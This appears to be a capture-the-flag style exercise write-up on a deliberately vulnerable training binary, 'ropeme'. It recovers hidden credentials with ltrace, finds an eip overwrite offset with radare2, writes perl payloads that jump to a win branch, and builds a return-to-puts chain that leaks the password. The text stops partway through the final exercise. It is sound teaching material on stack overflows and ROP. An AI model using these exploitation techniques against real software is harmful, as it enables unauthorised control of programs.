========
Write-up
========

Exercise 1
==========

Using `strings ./ropeme` we find a line "admin42". It happens to be the
username.

Exercise 2
==========

You can trace calls to library functions with ltrace. This includes strcmp:

::

    $ ltrace ./ropeme admin42
    __libc_start_main(0x8048553, 2, 0xffe934a4, 0x80485b0 <unfinished ...>
    strcmp("admin42", "admin42")                                         = 0
    printf("Enter password:
    ")                                          = 16
    read(0, "test\n", 512)                                               = 5
    strcmp("test\n",
    "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227") = -1
    puts("Wrong password"Enter password: Wrong password
    )                                               = 15
    +++ exited (status 1) +++


The password is "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227". To
see it without the octal notation one can use printf:

::

    $ printf "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227"
    ĳùð−÷<>[×


That explains why is didn't show up using "strings"!

Exercise 3
==========

Reading ltrace's output we can see that fgets is used to get user input
reading up to 512 chars from stdin. What happens if we really write 512
chars?

::

    $ perl -e 'print "A"x512' | ./ropeme admin42
      Segmentation fault      (core dumped) | ./ropeme admin42

Oh! This smells the buffer overflow! To know where exactly we overwrite the
instruction pointer (eip) I'll use a De Bruijn sequence (I could guess but
this is faster). This is done using radare2 tools.

Here ragg2 will generate a 500-bytes long sequence with no repetitions as
hexadecimal values, rax2 will convert it into ascii values, and we put it in
the clipboard using xclip so that we are able to paste it later.

::

    $ ragg2 -P 500 | rax2 -s - | xclip

Radare2 is then used in debug mode with rarun2 to launch the program with an
argument. We could use gdb but... well... radare2 ^^

::

    $ r2 -d rarun2 program=./ropeme arg1=admin42
        ...
     [0x7f2168f15d80]> dc
     Debugging pid = 4050, tid = 1 now
     [0xf7778b50]> dc
     Enter password:
     <paste here from clipboard>
     Wrong password
     [+] SIGNAL 11 errno=0 addr=0x41416641 code=1 ret=0
     [+] signal 11 aka SIGSEGV received 0
     [0x41416641]> woO 0x41416641
     92

Here we have the address at which it tried to return: 0x41416641
Still in radare2 we convert it into an offset to know how much padding we
need:

::

    [0x41416641]> woO 0x41416641
    92

Let's try that!

::

    $ perl -e 'print "A"x92 . "B"x4' | xclip
    $ r2 -c "dc;dc" -d rarun2 program=ropeme arg1=admin42
        ...
    Enter password:
    <paste>
    Wrong password
    [+] SIGNAL 11 errno=0 addr=0x42424242 code=1 ret=0
    [+] signal 11 aka SIGSEGV received 0
     -- Fill the bug. Fill it with love. With the creamy and hot sauce of love.
    [0x42424242]>

It works! We have taken eip! We just have to redirect it to section printing
the winning message. Let's disassemble the function checking the password:

::

    $ r2 ropeme
    [0x080483b0]> aa
    [0x080483b0]> is | grep password
    vaddr=0x08048496 paddr=0x00000496 ord=067 fwd=NONE sz=141 bind=GLOBAL type=FUNC name=check_password
    [0x080484e6]> pdf @ sym.check_password
    ╒ (fcn) sym.check_password 141
    │           ; var int local_22     @ ebp-0x58
    │           ; CALL XREF from 0x08048571 (sym.check_password)
    │           0x08048496    55             push ebp
    │           0x08048497    89e5           mov ebp, esp
    │           0x08048499    83ec58         sub esp, 0x58
    │           0x0804849c    83ec0c         sub esp, 0xc
    │           0x0804849f    6817860408     push str.Enter_password:
    │           0x080484a4    e887feffff     call sym.imp.puts
    │           0x080484a9    83c410         add esp, 0x10
    │           0x080484ac    83ec04         sub esp, 4
    │           0x080484af    6800020000     push 0x200
    │           0x080484b4    8d45a8         lea eax, [ebp-local_22]
    │           0x080484b7    50             push eax
    │           0x080484b8    6a00           push 0
    │           0x080484ba    e861feffff     call sym.imp.read
    │           0x080484bf    83c410         add esp, 0x10
    │           0x080484c2    85c0           test eax, eax
    │       ┌─< 0x080484c4    7517           jne 0x80484dd
    │       │   0x080484c6    83ec0c         sub esp, 0xc
    │       │   0x080484c9    6827860408     push str.Unable_to_get_the_password
    │       │   0x080484ce    e85dfeffff     call sym.imp.puts
    │       │   0x080484d3    83c410         add esp, 0x10
    │       │   0x080484d6    b801000000     mov eax, 1
    │      ┌──< 0x080484db    eb44           jmp 0x8048521
    │      │└─> 0x080484dd    83ec08         sub esp, 8
    │      │    0x080484e0    6842860408     push str.________________
    │      │    0x080484e5    8d45a8         lea eax, [ebp-local_22]
    │      │    0x080484e8    50             push eax
    │      │    0x080484e9    e822feffff     call sym.imp.strcmp
    │      │    0x080484ee    83c410         add esp, 0x10
    │      │    0x080484f1    85c0           test eax, eax
    │     ┌───< 0x080484f3    7517           jne 0x804850c
    │     ││    0x080484f5    83ec0c         sub esp, 0xc
    │     ││    0x080484f8    6853860408     push str.Yeah__You_win_
    │     ││    0x080484fd    e82efeffff     call sym.imp.puts
    │     ││    0x08048502    83c410         add esp, 0x10
    │     ││    0x08048505    b800000000     mov eax, 0
    │    ┌────< 0x0804850a    eb15           jmp 0x8048521
    │    │└───> 0x0804850c    83ec0c         sub esp, 0xc
    │    │ │    0x0804850f    6862860408     push str.Wrong_password
    │    │ │    0x08048514    e817feffff     call sym.imp.puts
    │    │ │    0x08048519    83c410         add esp, 0x10
    │    │ │    0x0804851c    b801000000     mov eax, 1
    │    └ └    ; JMP XREF from 0x0804850a (sym.check_password)
    │    └ └    ; JMP XREF from 0x080484db (sym.check_password)
    │    └─└──> 0x08048521    c9             leave
    ╘           0x08048522    c3             ret


Ok, so given the disassembly the key section is at 0x080484f8. Let's try that:

::

    $ perl -e 'print "A"x92 . "\xf8\x84\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    Yeah! You win!
    Segmentation fault (core dumped)

Finally!


Exercise 4
==========

When calling another function, the caller (say `main`) pushes the arguments
on the stack (not always, see further) and uses the call opcode that pushes
the current address on the stack for later return and then jumps to the
sub-routine location.

The sub-routine then pushes the ebp address to define its own stack frame,
takes the arguments from the stack to store them in local variables (often
pushing them back or just stocking them in registers), does its thing, then
pops the stack (the ebp address) and returns to the address at the top of the
stack (our previous return address put there by call). The instruction
pointer is incremented and the program continues.

I left away the stack allocation process besides push/pop because it isn't
very relevent here. Also there are other calling conventions besides the
stack. In x86_64, as the registers are bigger and more numerous they are the
primary way to pass arguments.

So the stack look like that before entering puts:

::

    ^ [string address]
    | [return address]

Note that as the stack is decreasing, pushing puts data at the bottom of this
diagram which is the top of the stack (facing downward). Also I represented
it without really using the opcode "call", that's why there is the return
address.

For strcmp it is similar, but note that the arguments are pushed in reverse
order:

::

    ^ [str2   address]
    | [str1   address]
    | [return address]

Exercise 5
==========

To display the password we will hijack a call to puts(). Such a call means
the stack will look somewhat like that before the call:

::

    ^ [password    address]
    | [puts return address]
    | [puts        address]
    | [padding to overflow]

The address of puts is direct:

::

    $ rabin2 -s ropeme | grep puts
    vaddr=0x08048330 paddr=0x00000330 ord=003 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts

So [puts address] is 0x08048330. In the same way we find the password address:

::

    $ rabin2 -z ropeme
    ...
    vaddr=0x08048642 paddr=0x00000642 ordinal=004 sz=17 len=9 section=.rodata type=ascii string=ĳùð−÷<>[×
    ...

By the way note how rabin2 isn't troubled at all by the weird password.

So far our stack is something like: "30830408XXXXXXXX42860408". Right now the
return address isn't really important, we will return to the end of the
check_password function, just before the return statement, at address
0x08048521.

::

    # Stack wanted:
    #
    # ^ [password    address] = 0x08048642
    # | [puts return address] = 0x08048521
    # | [puts        address] = 0x08048330
    # | [padding to overflow] = "A" x 92

    $ perl -e 'print "A"x92 . "\x30\x83\x04\x08\x21\x85\x04\x08\x42\x86\x04\x08"' | ./ropeme admin42
    Enter password: Wrong password
    ĳùð−÷<>[×
    Segmentation fault (core dumped)

Yeah!

Exercise 6
==========

We want to print an arbitrary message. The printing part can be done with
puts() but what about the "getting the message" part? The program provides
read(), and we can make use of it.

The read system call takes as argument a file descriptor, an address to write
to and a length.
